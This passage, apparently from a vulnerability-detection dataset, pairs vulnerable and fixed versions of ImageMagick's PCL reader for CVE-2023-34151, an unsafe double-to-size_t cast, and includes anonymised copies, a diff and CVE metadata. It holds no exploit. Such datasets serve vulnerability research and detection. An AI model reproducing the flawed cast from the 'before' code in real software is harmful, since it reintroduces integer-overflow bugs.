((size_t) (VAR_22-VAR_6) < (VAR_7-1)))
continue;
*VAR_22='\0';
VAR_22=VAR_6;
if (LocaleNCompare(VAR_3,VAR_6,strlen(VAR_3)) == 0)
VAR_17=VAR_40;
if (LocaleNCompare(VAR_2,VAR_6,strlen(VAR_2)) == 0)
{
VAR_27=(ssize_t) sscanf(VAR_6,""CropBox [%lf %lf %lf %lf"",
&VAR_24.x1,&VAR_24.y1,&VAR_24.x2,&VAR_24.y2);
if (VAR_27 != 4)
VAR_27=(ssize_t) sscanf(VAR_6,""CropBox[%lf %lf %lf %lf"",
&VAR_24.x1,&VAR_24.y1,&VAR_24.x2,&VAR_24.y2);
}
if (LocaleNCompare(VAR_4,VAR_6,strlen(VAR_4)) == 0)
{
VAR_27=(ssize_t) sscanf(VAR_6,""MediaBox [%lf %lf %lf %lf"",
&VAR_24.x1,&VAR_24.y1,&VAR_24.x2,&VAR_24.y2);
if (VAR_27 != 4)
VAR_27=(ssize_t) sscanf(VAR_6,""MediaBox[%lf %lf %lf %lf"",
&VAR_24.x1,&VAR_24.y1,&VAR_24.x2,&VAR_24.y2);
}
if (VAR_27 != 4)
continue;
VAR_26=(size_t)CastDoubleToLong(floor(VAR_24.x2-VAR_24.x1+0.5));
VAR_25=(size_t)CastDoubleToLong(floor(VAR_24.y2-VAR_24.y1+0.5));
if (VAR_26 > VAR_21.width)
VAR_21.width=VAR_26;
if (VAR_25 > VAR_21.height)
VAR_21.height=VAR_25;
}
(void) CloseBlob(VAR_14);
if ((VAR_21.width == 0) || (VAR_21.height == 0))
(void) ParseAbsoluteGeometry(VAR_42,&VAR_21);
if (VAR_0->page != (char *) NULL)
(void) ParseAbsoluteGeometry(VAR_0->page,&VAR_21);
(void) FormatLocaleString(VAR_10,VAR_7,""%.20gx%.20g"",(double)
VAR_21.width,(double) VAR_21.height);
if (VAR_0->monochrome != VAR_29)
VAR_13=GetDelegateInfo(""pcl:mono"",(char *) NULL,VAR_1);
else
if (VAR_17 != VAR_29)
VAR_13=GetDelegateInfo(""pcl:cmyk"",(char *) NULL,VAR_1);
else
VAR_13=GetDelegateInfo(""pcl:color"",(char *) NULL,VAR_1);
if (VAR_13 == (const DelegateInfo *) NULL)
{
VAR_14=DestroyImage(VAR_14);
return((Image *) NULL);
}
if ((VAR_21.width == 0) || (VAR_21.height == 0))
(void) ParseAbsoluteGeometry(VAR_42,&VAR_21);
if (VAR_0->page != (char *) NULL)
(void) ParseAbsoluteGeometry(VAR_0->page,&VAR_21);
VAR_8=AcquireString("""");
VAR_11=AcquireString("""");
(void) FormatLocaleString(VAR_8,VAR_7,""%gx%g"",
VAR_14->resolution.x,VAR_14->resolution.y);
if (VAR_0->ping != VAR_29)
(void) FormatLocaleString(VAR_8,VAR_7,""2.0x2.0"");
VAR_21.width=(size_t) floor(VAR_21.width*VAR_14->resolution.x/VAR_19.x+0.5);
VAR_21.height=(size_t) floor(VAR_21.height*VAR_14->resolution.y/VAR_19.y+0.5);
(void) FormatLocaleString(VAR_11,VAR_7,""-g%.20gx%.20g "",(double)
VAR_21.width,(double) VAR_21.height);
VAR_14=DestroyImage(VAR_14);
VAR_16=CloneImageInfo(VAR_0);
*VAR_16->magick='\0';
if (VAR_16->number_scenes != 0)
{
if (VAR_16->number_scenes != 1)
(void) FormatLocaleString(VAR_11,VAR_7,""-dLastPage=%.20g"",
(double) (VAR_16->scene+VAR_16->number_scenes));
else
(void) FormatLocaleString(VAR_11,VAR_7,
""-dFirstPage=%.20g -dLastPage=%.20g"",(double) VAR_16->scene+1,
(double) (VAR_16->scene+VAR_16->number_scenes));
VAR_16->number_scenes=0;
if (VAR_16->scenes != (char *) NULL)
*VAR_16->scenes='\0';
}
(void) CopyMagickString(VAR_9,VAR_16->filename,VAR_7);
(void) AcquireUniqueFilename(VAR_16->filename);
(void) FormatLocaleString(VAR_6,VAR_7,
GetDelegateCommands(VAR_13),
VAR_16->antialias != VAR_29 ? 4 : 1,
VAR_16->antialias != VAR_29 ? 4 : 1,VAR_8,VAR_11,
VAR_16->filename,VAR_12);
VAR_11=DestroyString(VAR_11);
VAR_8=DestroyString(VAR_8);
VAR_18=ExternalDelegateCommand(VAR_29,VAR_16->verbose,VAR_6,
(char *) NULL,VAR_1) != 0 ? VAR_40 : VAR_29;
VAR_14=ReadImage(VAR_16,VAR_1);
(void) RelinquishUniqueFileResource(VAR_16->filename);
(void) RelinquishUniqueFileResource(VAR_12);
VAR_16=DestroyImageInfo(VAR_16);
if (VAR_14 == (Image *) NULL)
ThrowReaderException(VAR_43,""PCLDelegateFailed"");
if (LocaleCompare(VAR_14->magick,""BMP"") == 0)
{
Image
*VAR_44;
VAR_44=ConsolidateCMYKImages(VAR_14,VAR_1);
if (VAR_44 != (Image *) NULL)
{
VAR_14=DestroyImageList(VAR_14);
VAR_14=VAR_44;
}
}
do
{
(void) CopyMagickString(VAR_14->filename,VAR_9,VAR_7);
VAR_14->page=VAR_21;
if (VAR_0->ping != VAR_29)
{
VAR_14->magick_columns*=VAR_14->resolution.x/2.0;
VAR_14->magick_rows*=VAR_14->resolution.y/2.0;
VAR_14->columns*=VAR_14->resolution.x/2.0;
VAR_14->rows*=VAR_14->resolution.y/2.0;
}
VAR_15=SyncNextImageInList(VAR_14);
if (VAR_15 != (Image *) NULL)
VAR_14=VAR_15;
} while (VAR_15 != (Image *) NULL);
return(GetFirstImageInList(VAR_14));
}",ImageMagick/3d6d98d8a2be30d74172ab43b5b8e874d2deb158/pcl.c/vul/before/0.json,"static Image *ReadPCLImage(const ImageInfo *image_info,ExceptionInfo *exception)
{
#define CropBox  ""CropBox""
#define DeviceCMYK  ""DeviceCMYK""
#define MediaBox  ""MediaBox""
#define RenderPCLText  ""  Rendering PCL...  ""

  char
    command[MagickPathExtent],
    *density,
    filename[MagickPathExtent],
    geometry[MagickPathExtent],
    *options,
    input_filename[MagickPathExtent];

  const DelegateInfo
    *delegate_info;

  Image
    *image,
    *next_image;

  ImageInfo
    *read_info;

  MagickBooleanType
    cmyk,
    status;

  PointInfo
    delta;

  RectangleInfo
    bounding_box,
    page;

  char
    *p;

  ssize_t
    c;

  SegmentInfo
    bounds;

  size_t
    height,
    width;

  ssize_t
    count;

  assert(image_info != (const ImageInfo *) NULL);
  assert(image_info->signature == MagickCoreSignature);
  assert(exception != (ExceptionInfo *) NULL);
  assert(exception->signature == MagickCoreSignature);
  if (IsEventLogging() != MagickFalse)
    (void) LogMagickEvent(TraceEvent,GetMagickModule(),""%s"",
      image_info->filename);
  /*
    Open image file.
  */
  image=AcquireImage(image_info,exception);
  status=OpenBlob(image_info,image,ReadBinaryBlobMode,exception);
  if (status == MagickFalse)
    {
      image=DestroyImageList(image);
      return((Image *) NULL);
    }
  status=AcquireUniqueSymbolicLink(image_info->filename,input_filename);
  if (status == MagickFalse)
    {
      ThrowFileException(exception,FileOpenError,""UnableToCreateTemporaryFile"",
        image_info->filename);
      image=DestroyImageList(image);
      return((Image *) NULL);
    }
  /*
    Set the page density.
  */
  delta.x=DefaultResolution;
  delta.y=DefaultResolution;
  if ((image->resolution.x == 0.0) || (image->resolution.y == 0.0))
    {
      GeometryInfo
        geometry_info;

      MagickStatusType
        flags;

      flags=ParseGeometry(PSDensityGeometry,&geometry_info);
      if ((flags & RhoValue) != 0)
        image->resolution.x=geometry_info.rho;
      image->resolution.y=image->resolution.x;
      if ((flags & SigmaValue) != 0)
        image->resolution.y=geometry_info.sigma;
    }
  /*
    Determine page geometry from the PCL media box.
  */
  cmyk=image->colorspace == CMYKColorspace ? MagickTrue : MagickFalse;
  count=0;
  (void) memset(&bounding_box,0,sizeof(bounding_box));
  (void) memset(&bounds,0,sizeof(bounds));
  (void) memset(&page,0,sizeof(page));
  (void) memset(command,0,sizeof(command));
  p=command;
  for (c=ReadBlobByte(image); c != EOF; c=ReadBlobByte(image))
  {
    if (image_info->page != (char *) NULL)
      continue;
    /*
      Note PCL elements.
    */
    *p++=(char) c;
    if ((c != (int) '/') && (c != '\n') &&
        ((size_t) (p-command) < (MagickPathExtent-1)))
      continue;
    *p='\0';
    p=command;
    /*
      Is this a CMYK document?
    */
    if (LocaleNCompare(DeviceCMYK,command,strlen(DeviceCMYK)) == 0)
      cmyk=MagickTrue;
    if (LocaleNCompare(CropBox,command,strlen(CropBox)) == 0)
      {
        /*
          Note region defined by crop box.
        */
        count=(ssize_t) sscanf(command,""CropBox [%lf %lf %lf %lf"",
          &bounds.x1,&bounds.y1,&bounds.x2,&bounds.y2);
        if (count != 4)
          count=(ssize_t) sscanf(command,""CropBox[%lf %lf %lf %lf"",
            &bounds.x1,&bounds.y1,&bounds.x2,&bounds.y2);
      }
    if (LocaleNCompare(MediaBox,command,strlen(MediaBox)) == 0)
      {
        /*
          Note region defined by media box.
        */
        count=(ssize_t) sscanf(command,""MediaBox [%lf %lf %lf %lf"",
          &bounds.x1,&bounds.y1,&bounds.x2,&bounds.y2);
        if (count != 4)
          count=(ssize_t) sscanf(command,""MediaBox[%lf %lf %lf %lf"",
            &bounds.x1,&bounds.y1,&bounds.x2,&bounds.y2);
      }
    if (count != 4)
      continue;
    /*
      Set PCL render geometry.
    */
    width=(size_t)CastDoubleToLong(floor(bounds.x2-bounds.x1+0.5));
    height=(size_t)CastDoubleToLong(floor(bounds.y2-bounds.y1+0.5));
    if (width > page.width)
      page.width=width;
    if (height > page.height)
      page.height=height;
  }
  (void) CloseBlob(image);
  /*
    Render PCL with the GhostPCL delegate.
  */
  if ((page.width == 0) || (page.height == 0))
    (void) ParseAbsoluteGeometry(PSPageGeometry,&page);
  if (image_info->page != (char *) NULL)
    (void) ParseAbsoluteGeometry(image_info->page,&page);
  (void) FormatLocaleString(geometry,MagickPathExtent,""%.20gx%.20g"",(double)
    page.width,(double) page.height);
  if (image_info->monochrome != MagickFalse)
    delegate_info=GetDelegateInfo(""pcl:mono"",(char *) NULL,exception);
  else
     if (cmyk != MagickFalse)
       delegate_info=GetDelegateInfo(""pcl:cmyk"",(char *) NULL,exception);
     else
       delegate_info=GetDelegateInfo(""pcl:color"",(char *) NULL,exception);
  if (delegate_info == (const DelegateInfo *) NULL)
    {
      image=DestroyImage(image);
      return((Image *) NULL);
    }
  if ((page.width == 0) || (page.height == 0))
    (void) ParseAbsoluteGeometry(PSPageGeometry,&page);
  if (image_info->page != (char *) NULL)
    (void) ParseAbsoluteGeometry(image_info->page,&page);
  density=AcquireString("""");
  options=AcquireString("""");
  (void) FormatLocaleString(density,MagickPathExtent,""%gx%g"",
    image->resolution.x,image->resolution.y);
  if (image_info->ping != MagickFalse)
    (void) FormatLocaleString(density,MagickPathExtent,""2.0x2.0"");
  page.width=CastDoubleToUnsigned(page.width*image->resolution.x/delta.x+0.5);
  page.height=CastDoubleToUnsigned(page.height*image->resolution.y/delta.y+0.5);
  (void) FormatLocaleString(options,MagickPathExtent,""-g%.20gx%.20g "",(double)
    page.width,(double) page.height);
  image=DestroyImage(image);
  read_info=CloneImageInfo(image_info);
  *read_info->magick='\0';
  if (read_info->number_scenes != 0)
    {
      if (read_info->number_scenes != 1)
        (void) FormatLocaleString(options,MagickPathExtent,""-dLastPage=%.20g"",
          (double) (read_info->scene+read_info->number_scenes));
      else
        (void) FormatLocaleString(options,MagickPathExtent,
          ""-dFirstPage=%.20g -dLastPage=%.20g"",(double) read_info->scene+1,
          (double) (read_info->scene+read_info->number_scenes));
      read_info->number_scenes=0;
      if (read_info->scenes != (char *) NULL)
        *read_info->scenes='\0';
    }
  (void) CopyMagickString(filename,read_info->filename,MagickPathExtent);
  (void) AcquireUniqueFilename(read_info->filename);
  (void) FormatLocaleString(command,MagickPathExtent,
    GetDelegateCommands(delegate_info),
    read_info->antialias != MagickFalse ? 4 : 1,
    read_info->antialias != MagickFalse ? 4 : 1,density,options,
    read_info->filename,input_filename);
  options=DestroyString(options);
  density=DestroyString(density);
  status=ExternalDelegateCommand(MagickFalse,read_info->verbose,command,
    (char *) NULL,exception) != 0 ? MagickTrue : MagickFalse;
  image=ReadImage(read_info,exception);
  (void) RelinquishUniqueFileResource(read_info->filename);
  (void) RelinquishUniqueFileResource(input_filename);
  read_info=DestroyImageInfo(read_info);
  if (image == (Image *) NULL)
    ThrowReaderException(DelegateError,""PCLDelegateFailed"");
  if (LocaleCompare(image->magick,""BMP"") == 0)
    {
      Image
        *cmyk_image;

      cmyk_image=ConsolidateCMYKImages(image,exception);
      if (cmyk_image != (Image *) NULL)
        {
          image=DestroyImageList(image);
          image=cmyk_image;
        }
    }
  do
  {
    (void) CopyMagickString(image->filename,filename,MagickPathExtent);
    image->page=page;
    if (image_info->ping != MagickFalse)
      {
        image->magick_columns*=image->resolution.x/2.0;
        image->magick_rows*=image->resolution.y/2.0;
        image->columns*=image->resolution.x/2.0;
        image->rows*=image->resolution.y/2.0;
      }
    next_image=SyncNextImageInList(image);
    if (next_image != (Image *) NULL)
      image=next_image;
  } while (next_image != (Image *) NULL);
  return(GetFirstImageInList(image));
}","static Image *ReadPCLImage(const ImageInfo *VAR_0,ExceptionInfo *VAR_1)
{
#define VAR_2  ""CropBox""
#define VAR_3  ""DeviceCMYK""
#define VAR_4  ""MediaBox""
#define VAR_5  ""  Rendering PCL...  ""

  char
    VAR_6[VAR_7],
    *VAR_8,
    VAR_9[VAR_7],
    VAR_10[VAR_7],
    *VAR_11,
    VAR_12[VAR_7];

  const DelegateInfo
    *VAR_13;

  Image
    *VAR_14,
    *VAR_15;

  ImageInfo
    *VAR_16;

  MagickBooleanType
    VAR_17,
    VAR_18;

  PointInfo
    VAR_19;

  RectangleInfo
    VAR_20,
    VAR_21;

  char
    *VAR_22;

  ssize_t
    VAR_23;

  SegmentInfo
    VAR_24;

  size_t
    VAR_25,
    VAR_26;

  ssize_t
    VAR_27;

  assert(VAR_0 != (const ImageInfo *) NULL);
  assert(VAR_0->signature == VAR_28);
  assert(VAR_1 != (ExceptionInfo *) NULL);
  assert(VAR_1->signature == VAR_28);
  if (IsEventLogging() != VAR_29)
    (void) LogMagickEvent(VAR_30,GetMagickModule(),""%s"",
      VAR_0->filename);
  /* COMMENT_0 */
                    
    
  VAR_14=AcquireImage(VAR_0,VAR_1);
  VAR_18=OpenBlob(VAR_0,VAR_14,VAR_31,VAR_1);
  if (VAR_18 == VAR_29)
    {
      VAR_14=DestroyImageList(VAR_14);
      return((Image *) NULL);
    }
  VAR_18=AcquireUniqueSymbolicLink(VAR_0->filename,VAR_12);
  if (VAR_18 == VAR_29)
    {
      ThrowFileException(VAR_1,VAR_32,""UnableToCreateTemporaryFile"",
        VAR_0->filename);
      VAR_14=DestroyImageList(VAR_14);
      return((Image *) NULL);
    }
  /* COMMENT_3 */
                         
    
  VAR_19.x=VAR_33;
  VAR_19.y=VAR_33;
  if ((VAR_14->resolution.x == 0.0) || (VAR_14->resolution.y == 0.0))
    {
      GeometryInfo
        VAR_34;

      MagickStatusType
        VAR_35;

      VAR_35=ParseGeometry(VAR_36,&VAR_34);
      if ((VAR_35 & VAR_37) != 0)
        VAR_14->resolution.x=VAR_34.rho;
      VAR_14->resolution.y=VAR_14->resolution.x;
      if ((VAR_35 & VAR_38) != 0)
        VAR_14->resolution.y=VAR_34.sigma;
    }
  /* COMMENT_6 */
                                                   
    
  VAR_17=VAR_14->colorspace == VAR_39 ? VAR_40 : VAR_29;
  VAR_27=0;
  (void) memset(&VAR_20,0,sizeof(VAR_20));
  (void) memset(&VAR_24,0,sizeof(VAR_24));
  (void) memset(&VAR_21,0,sizeof(VAR_21));
  (void) memset(VAR_6,0,sizeof(VAR_6));
  VAR_22=VAR_6;
  for (VAR_23=ReadBlobByte(VAR_14); VAR_23 != VAR_41; VAR_23=ReadBlobByte(VAR_14))
  {
    if (VAR_0->page != (char *) NULL)
      continue;
    /* COMMENT_9 */
                        
      
    *VAR_22++=(char) VAR_23;
    if ((VAR_23 != (int) '/') && (VAR_23 != '\n') &&
        ((size_t) (VAR_22-VAR_6) < (VAR_7-1)))
      continue;
    *VAR_22='\0';
    VAR_22=VAR_6;
    /* COMMENT_12 */
                              
      
    if (LocaleNCompare(VAR_3,VAR_6,strlen(VAR_3)) == 0)
      VAR_17=VAR_40;
    if (LocaleNCompare(VAR_2,VAR_6,strlen(VAR_2)) == 0)
      {
        /* COMMENT_15 */
                                          
          
        VAR_27=(ssize_t) sscanf(VAR_6,""CropBox [%lf %lf %lf %lf"",
          &VAR_24.x1,&VAR_24.y1,&VAR_24.x2,&VAR_24.y2);
        if (VAR_27 != 4)
          VAR_27=(ssize_t) sscanf(VAR_6,""CropBox[%lf %lf %lf %lf"",
            &VAR_24.x1,&VAR_24.y1,&VAR_24.x2,&VAR_24.y2);
      }
    if (LocaleNCompare(VAR_4,VAR_6,strlen(VAR_4)) == 0)
      {
        /* COMMENT_18 */
                                           
          
        VAR_27=(ssize_t) sscanf(VAR_6,""MediaBox [%lf %lf %lf %lf"",
          &VAR_24.x1,&VAR_24.y1,&VAR_24.x2,&VAR_24.y2);
        if (VAR_27 != 4)
          VAR_27=(ssize_t) sscanf(VAR_6,""MediaBox[%lf %lf %lf %lf"",
            &VAR_24.x1,&VAR_24.y1,&VAR_24.x2,&VAR_24.y2);
      }
    if (VAR_27 != 4)
      continue;
    /* COMMENT_21 */
                              
      
    VAR_26=(size_t)CastDoubleToLong(floor(VAR_24.x2-VAR_24.x1+0.5));
    VAR_25=(size_t)CastDoubleToLong(floor(VAR_24.y2-VAR_24.y1+0.5));
    if (VAR_26 > VAR_21.width)
      VAR_21.width=VAR_26;
    if (VAR_25 > VAR_21.height)
      VAR_21.height=VAR_25;
  }
  (void) CloseBlob(VAR_14);
  /* COMMENT_24 */
                                          
    
  if ((VAR_21.width == 0) || (VAR_21.height == 0))
    (void) ParseAbsoluteGeometry(VAR_42,&VAR_21);
  if (VAR_0->page != (char *) NULL)
    (void) ParseAbsoluteGeometry(VAR_0->page,&VAR_21);
  (void) FormatLocaleString(VAR_10,VAR_7,""%.20gx%.20g"",(double)
    VAR_21.width,(double) VAR_21.height);
  if (VAR_0->monochrome != VAR_29)
    VAR_13=GetDelegateInfo(""pcl:mono"",(char *) NULL,VAR_1);
  else
     if (VAR_17 != VAR_29)
       VAR_13=GetDelegateInfo(""pcl:cmyk"",(char *) NULL,VAR_1);
     else
       VAR_13=GetDelegateInfo(""pcl:color"",(char *) NULL,VAR_1);
  if (VAR_13 == (const DelegateInfo *) NULL)
    {
      VAR_14=DestroyImage(VAR_14);
      return((Image *) NULL);
    }
  if ((VAR_21.width == 0) || (VAR_21.height == 0))
    (void) ParseAbsoluteGeometry(VAR_42,&VAR_21);
  if (VAR_0->page != (char *) NULL)
    (void) ParseAbsoluteGeometry(VAR_0->page,&VAR_21);
  VAR_8=AcquireString("""");
  VAR_11=AcquireString("""");
  (void) FormatLocaleString(VAR_8,VAR_7,""%gx%g"",
    VAR_14->resolution.x,VAR_14->resolution.y);
  if (VAR_0->ping != VAR_29)
    (void) FormatLocaleString(VAR_8,VAR_7,""2.0x2.0"");
  VAR_21.width=CastDoubleToUnsigned(VAR_21.width*VAR_14->resolution.x/VAR_19.x+0.5);
  VAR_21.height=CastDoubleToUnsigned(VAR_21.height*VAR_14->resolution.y/VAR_19.y+0.5);
  (void) FormatLocaleString(VAR_11,VAR_7,""-g%.20gx%.20g "",(double)
    VAR_21.width,(double) VAR_21.height);
  VAR_14=DestroyImage(VAR_14);
  VAR_16=CloneImageInfo(VAR_0);
  *VAR_16->magick='\0';
  if (VAR_16->number_scenes != 0)
    {
      if (VAR_16->number_scenes != 1)
        (void) FormatLocaleString(VAR_11,VAR_7,""-dLastPage=%.20g"",
          (double) (VAR_16->scene+VAR_16->number_scenes));
      else
        (void) FormatLocaleString(VAR_11,VAR_7,
          ""-dFirstPage=%.20g -dLastPage=%.20g"",(double) VAR_16->scene+1,
          (double) (VAR_16->scene+VAR_16->number_scenes));
      VAR_16->number_scenes=0;
      if (VAR_16->scenes != (char *) NULL)
        *VAR_16->scenes='\0';
    }
  (void) CopyMagickString(VAR_9,VAR_16->filename,VAR_7);
  (void) AcquireUniqueFilename(VAR_16->filename);
  (void) FormatLocaleString(VAR_6,VAR_7,
    GetDelegateCommands(VAR_13),
    VAR_16->antialias != VAR_29 ? 4 : 1,
    VAR_16->antialias != VAR_29 ? 4 : 1,VAR_8,VAR_11,
    VAR_16->filename,VAR_12);
  VAR_11=DestroyString(VAR_11);
  VAR_8=DestroyString(VAR_8);
  VAR_18=ExternalDelegateCommand(VAR_29,VAR_16->verbose,VAR_6,
    (char *) NULL,VAR_1) != 0 ? VAR_40 : VAR_29;
  VAR_14=ReadImage(VAR_16,VAR_1);
  (void) RelinquishUniqueFileResource(VAR_16->filename);
  (void) RelinquishUniqueFileResource(VAR_12);
  VAR_16=DestroyImageInfo(VAR_16);
  if (VAR_14 == (Image *) NULL)
    ThrowReaderException(VAR_43,""PCLDelegateFailed"");
  if (LocaleCompare(VAR_14->magick,""BMP"") == 0)
    {
      Image
        *VAR_44;

      VAR_44=ConsolidateCMYKImages(VAR_14,VAR_1);
      if (VAR_44 != (Image *) NULL)
        {
          VAR_14=DestroyImageList(VAR_14);
          VAR_14=VAR_44;
        }
    }
  do
  {
    (void) CopyMagickString(VAR_14->filename,VAR_9,VAR_7);
    VAR_14->page=VAR_21;
    if (VAR_0->ping != VAR_29)
      {
        VAR_14->magick_columns*=VAR_14->resolution.x/2.0;
        VAR_14->magick_rows*=VAR_14->resolution.y/2.0;
        VAR_14->columns*=VAR_14->resolution.x/2.0;
        VAR_14->rows*=VAR_14->resolution.y/2.0;
      }
    VAR_15=SyncNextImageInList(VAR_14);
    if (VAR_15 != (Image *) NULL)
      VAR_14=VAR_15;
  } while (VAR_15 != (Image *) NULL);
  return(GetFirstImageInList(VAR_14));
}",ImageMagick/3d6d98d8a2be30d74172ab43b5b8e874d2deb158/pcl.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -189,8 +189,8 @@
     image->resolution.x,image->resolution.y);
   if (image_info->ping != MagickFalse)
     (void) FormatLocaleString(density,MagickPathExtent,""2.0x2.0"");
-  page.width=(size_t) floor(page.width*image->resolution.x/delta.x+0.5);
-  page.height=(size_t) floor(page.height*image->resolution.y/delta.y+0.5);
+  page.width=CastDoubleToUnsigned(page.width*image->resolution.x/delta.x+0.5);
+  page.height=CastDoubleToUnsigned(page.height*image->resolution.y/delta.y+0.5);
   (void) FormatLocaleString(options,MagickPathExtent,""-g%.20gx%.20g "",(double)
     page.width,(double) page.height);
   image=DestroyImage(image);","{'deleted_lines': ['  page.width=(size_t) floor(page.width*image->resolution.x/delta.x+0.5);', '  page.height=(size_t) floor(page.height*image->resolution.y/delta.y+0.5);'], 'added_lines': ['  page.width=CastDoubleToUnsigned(page.width*image->resolution.x/delta.x+0.5);', '  page.height=CastDoubleToUnsigned(page.height*image->resolution.y/delta.y+0.5);']}",True,"A vulnerability was found in ImageMagick. This security flaw ouccers as an undefined behaviors of casting double to size_t in svg, mvg and other coders (recurring bugs of CVE-2022-32546).",5.5,MEDIUM,1,valid,2023-05-18T01:06:15Z,4
CVE-2023-34151,['CWE-190'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,ImageMagick,properly cast double to size_t (https://github.com/ImageMagick/ImageMagick/issues/6341),3d6d98d8a2be30d74172ab43b5b8e874d2deb158,https://github.com/ImageMagick/ImageMagick/commit/3d6d98d8a2be30d74172ab43b5b8e874d2deb158,MagickCore/annotate.c,AnnotateImage,"MagickExport MagickBooleanType AnnotateImage(Image *image,
const DrawInfo *draw_info,ExceptionInfo *exception)
{
char
*p,
color[MagickPathExtent],
primitive[MagickPathExtent],
*text,
**textlist;
DrawInfo
*annotate,
*annotate_info;
GeometryInfo
geometry_info;
MagickBooleanType
status;
PixelInfo
pixel;
PointInfo
offset;
RectangleInfo
geometry;
ssize_t
i;
TypeMetric
metrics;
size_t
height,
number_lines;
assert(image != (Image *) NULL);
assert(image->signature == MagickCoreSignature);
if (IsEventLogging() != MagickFalse)
(void) LogMagickEvent(TraceEvent,GetMagickModule(),""%s"",image->filename);
assert(draw_info != (DrawInfo *) NULL);
assert(draw_info->signature == MagickCoreSignature);
if (draw_info->text == (char *) NULL)
return(MagickFalse);
if (*draw_info->text == '\0')
return(MagickTrue);
annotate=CloneDrawInfo((ImageInfo *) NULL,draw_info);
text=annotate->text;
annotate->text=(char *) NULL;
annotate_info=CloneDrawInfo((ImageInfo *) NULL,draw_info);
number_lines=1;
for (p=text; *p != '\0'; p++)
if (*p == '\n')
number_lines++;
textlist=(char **) AcquireQuantumMemory(number_lines+1,sizeof(*textlist));
if (textlist == (char **) NULL)
{
annotate_info=DestroyDrawInfo(annotate_info);
annotate=DestroyDrawInfo(annotate);
text=DestroyString(text);
return(MagickFalse);
}
p=text;
for (i=0; i < (ssize_t) number_lines; i++)
{
char
*q;
textlist[i]=p;
for (q=p; *q != '\0'; q++)
if ((*q == '\r') || (*q == '\n'))
break;
if (*q == '\r')
{
*q='\0';
q++;
}
*q='\0';
p=q+1;
}
textlist[i]=(char *) NULL;
SetGeometry(image,&geometry);
SetGeometryInfo(&geometry_info);
if (annotate_info->geometry != (char *) NULL)
{
(void) ParsePageGeometry(image,annotate_info->geometry,&geometry,
exception);
(void) ParseGeometry(annotate_info->geometry,&geometry_info);
}
if (SetImageStorageClass(image,DirectClass,exception) == MagickFalse)
{
annotate_info=DestroyDrawInfo(annotate_info);
annotate=DestroyDrawInfo(annotate);
textlist=(char **) RelinquishMagickMemory(textlist);
text=DestroyString(text);
return(MagickFalse);
}
if (IsGrayColorspace(image->colorspace) != MagickFalse)
(void) SetImageColorspace(image,sRGBColorspace,exception);
status=MagickTrue;
(void) memset(&metrics,0,sizeof(metrics));
for (i=0; textlist[i] != (char *) NULL; i++)
{
if (*textlist[i] == '\0')
continue;
annotate_info->affine.tx=geometry_info.xi-image->page.x;
annotate_info->affine.ty=geometry_info.psi-image->page.y;
(void) CloneString(&annotate->text,textlist[i]);
if ((metrics.width == 0) || (annotate->gravity != NorthWestGravity))
(void) GetTypeMetrics(image,annotate,&metrics,exception);
height=(size_t) floor(metrics.ascent-metrics.descent+0.5);
if (height == 0)
height=draw_info->pointsize;
height+=(size_t) floor(draw_info->interline_spacing+0.5);
switch (annotate->gravity)
{
case UndefinedGravity:
default:
{
offset.x=annotate_info->affine.tx+i*annotate_info->affine.ry*height;
offset.y=annotate_info->affine.ty+i*annotate_info->affine.sy*height;
break;
}
case (GravityType) NorthWestGravity:
{
offset.x=(geometry.width == 0 ? -1.0 : 1.0)*annotate_info->affine.tx+i*
annotate_info->affine.ry*height+annotate_info->affine.ry*
(metrics.ascent+metrics.descent);
offset.y=(geometry.height == 0 ? -1.0 : 1.0)*annotate_info->affine.ty+i*
annotate_info->affine.sy*height+annotate_info->affine.sy*
metrics.ascent;
break;
}
case (GravityType) NorthGravity:
{
offset.x=(geometry.width == 0 ? -1.0 : 1.0)*annotate_info->affine.tx+
geometry.width/2.0+i*annotate_info->affine.ry*height-
annotate_info->affine.sx*metrics.width/2.0+annotate_info->affine.ry*
(metrics.ascent+metrics.descent);
offset.y=(geometry.height == 0 ? -1.0 : 1.0)*annotate_info->affine.ty+i*
annotate_info->affine.sy*height+annotate_info->affine.sy*
metrics.ascent-annotate_info->affine.rx*metrics.width/2.0;
break;
}
case (GravityType) NorthEastGravity:
{
offset.x=(geometry.width == 0 ? 1.0 : -1.0)*annotate_info->affine.tx+
geometry.width+i*annotate_info->affine.ry*height-
annotate_info->affine.sx*metrics.width+annotate_info->affine.ry*
(metrics.ascent+metrics.descent)-1.0;
offset.y=(geometry.height == 0 ? -1.0 : 1.0)*annotate_info->affine.ty+i*
annotate_info->affine.sy*height+annotate_info->affine.sy*
metrics.ascent-annotate_info->affine.rx*metrics.width;
break;
}
case (GravityType) WestGravity:
{
offset.x=(geometry.width == 0 ? -1.0 : 1.0)*annotate_info->affine.tx+i*
annotate_info->affine.ry*height+annotate_info->affine.ry*
(metrics.ascent+metrics.descent-(number_lines-1.0)*height)/2.0;
offset.y=(geometry.height == 0 ? -1.0 : 1.0)*annotate_info->affine.ty+
geometry.height/2.0+i*annotate_info->affine.sy*height+
annotate_info->affine.sy*(metrics.ascent+metrics.descent-
(number_lines-1.0)*height)/2.0;
break;
}
case (GravityType) CenterGravity:
{
offset.x=(geometry.width == 0 ? -1.0 : 1.0)*annotate_info->affine.tx+
geometry.width/2.0+i*annotate_info->affine.ry*height-
annotate_info->affine.sx*metrics.width/2.0+annotate_info->affine.ry*
(metrics.ascent+metrics.descent-(number_lines-1.0)*height)/2.0;
offset.y=(geometry.height == 0 ? -1.0 : 1.0)*annotate_info->affine.ty+
geometry.height/2.0+i*annotate_info->affine.sy*height-
annotate_info->affine.rx*metrics.width/2.0+annotate_info->affine.sy*
(metrics.ascent+metrics.descent-(number_lines-1.0)*height)/2.0;
break;
}
case (GravityType) EastGravity:
{
offset.x=(geometry.width == 0 ? 1.0 : -1.0)*annotate_info->affine.tx+
geometry.width+i*annotate_info->affine.ry*height-
annotate_info->affine.sx*metrics.width+
annotate_info->affine.ry*(metrics.ascent+metrics.descent-
(number_lines-1.0)*height)/2.0-1.0;
offset.y=(geometry.height == 0 ? -1.0 : 1.0)*annotate_info->affine.ty+
geometry.height/2.0+i*annotate_info->affine.sy*height-
annotate_info->affine.rx*metrics.width+
annotate_info->affine.sy*(metrics.ascent+metrics.descent-
(number_lines-1.0)*height)/2.0;
break;
}
case (GravityType) SouthWestGravity:
{
offset.x=(geometry.width == 0 ? -1.0 : 1.0)*annotate_info->affine.tx+i*
annotate_info->affine.ry*height-annotate_info->affine.ry*
(number_lines-1.0)*height;
